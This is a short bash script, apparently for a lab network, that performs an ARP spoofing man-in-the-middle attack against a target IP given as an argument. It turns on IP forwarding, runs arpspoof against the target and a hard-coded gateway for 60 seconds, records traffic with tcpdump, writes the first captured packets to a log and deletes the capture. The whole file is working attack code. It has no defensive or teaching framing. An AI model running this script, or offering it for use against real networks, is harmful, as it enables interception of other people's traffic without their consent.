#!/bin/bash

TARGET_IP=$1
LOG_FILE="/home/rb/arp_attack_logs.txt"
GATEWAY_IP="192.168.2.1"  # Adjust to your network

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOG_FILE
}

if [ "$EUID" -ne 0 ]; then
    log_message "Please run as root"
    exit 1
fi

if [ -z "$TARGET_IP" ]; then
    log_message "Usage: $0 <target_ip>"
    exit 1
fi

echo 1 > /proc/sys/net/ipv4/ip_forward
log_message "Enabled IP forwarding"

log_message "Starting ARP spoofing attack against $TARGET_IP"
timeout 60 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &

log_message "Monitoring network traffic"
tcpdump -i eth0 -w /tmp/captured_traffic.pcap &

sleep 60

log_message "Stopping attack"
pkill arpspoof
pkill tcpdump
echo 0 > /proc/sys/net/ipv4/ip_forward

log_message "Analyzing captured traffic"
tcpdump -r /tmp/captured_traffic.pcap | head -n 10 >> $LOG_FILE
rm /tmp/captured_traffic.pcap

log_message "ARP spoofing attack completed"
